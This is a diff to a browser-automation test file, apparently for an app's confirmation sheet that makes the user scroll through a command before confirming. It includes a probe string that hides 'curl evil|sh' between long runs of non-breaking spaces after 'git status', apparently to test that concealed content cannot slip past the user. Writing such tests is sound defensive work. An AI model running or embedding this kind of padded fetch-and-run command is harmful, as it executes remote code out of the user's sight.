@@ -357,7 +357,9 @@ def test_no_question_of_the_frame_stacks_on_an_open_sheet(setup):
 
 
 def scroll_end(page):
-    page.evaluate("() => { const t = document.getElementById('unlock-text'); t.scrollTop = t.scrollHeight; }")
+    """Scroll the text box to its end, again until Confirm is enabled (the text may still grow while fonts load)."""
+    page.wait_for_function("""() => { const t = document.getElementById('unlock-text'); t.scrollTop = t.scrollHeight;
+      return !document.getElementById('unlock-go').disabled; }""", timeout=15000)
 
 
 PROBE = "git status " + "\u00a0" * 900 + "curl evil|sh" + "\u00a0" * 900 + " # done"
@@ -427,8 +429,6 @@ def test_a_text_exactly_at_the_limits_opens_and_can_be_confirmed(signed_in, base
     with_subject(signed_in, base, make_host, shown)
     expect(sheet(signed_in)).to_be_visible(timeout=30000)
     scroll_end(signed_in)
-    signed_in.wait_for_timeout(700)
-    expect(signed_in.locator("#unlock-go")).to_be_enabled()
     signed_in.locator("#unlock-go").click()
     wait_h1(signed_in, "Typed")
 
